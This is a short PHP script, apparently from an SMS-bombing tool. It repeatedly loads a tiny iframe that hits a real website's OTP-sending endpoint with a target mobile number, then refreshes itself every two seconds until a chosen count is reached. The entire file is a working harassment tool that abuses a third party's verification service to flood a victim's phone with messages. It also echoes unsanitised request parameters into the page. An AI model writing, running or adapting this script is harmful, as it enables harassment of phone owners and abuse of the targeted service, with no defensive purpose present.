<?php 
$count=$_REQUEST['count'];
$sent=$_REQUEST['sent'];
$mobno=$_REQUEST['mobno'];
if($sent==$count){	
	header("location:index.php?msg=total ".$count." otp send successuffly");
}
else{ 
	
 


?>
 <iframe style="height:20px; width:20px;" src="https://myaccount.sulekha.com/network/userauthsulv2.aspx?mode=sendvcode&mobilenumber=<?php echo $mobno ?>&rnd=0.31694361754276956&callback=jQuery110205845926706765199_1592198195425">
 </iframe>
 <?php

	$sentinc=$sent+1;
   $rl="26.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno;
   ?><center><div style="height: 50px;width: 40rem;border-radius:20px;background:#00F306;color: black;font-size: 32px;border:2px dotted red;padding-top: 8px;font-family: Yu Gothic;"> <?php echo $sent; ?> OTP SEND AND CONTINUE....</div></center><?php
	echo '<META HTTP-EQUIV=REFRESH CONTENT="2; '.$rl.'">';
	//header("location:2.php?sent=".$sentinc."&&count=".$count."&&mobno=".$mobno);
}
?>
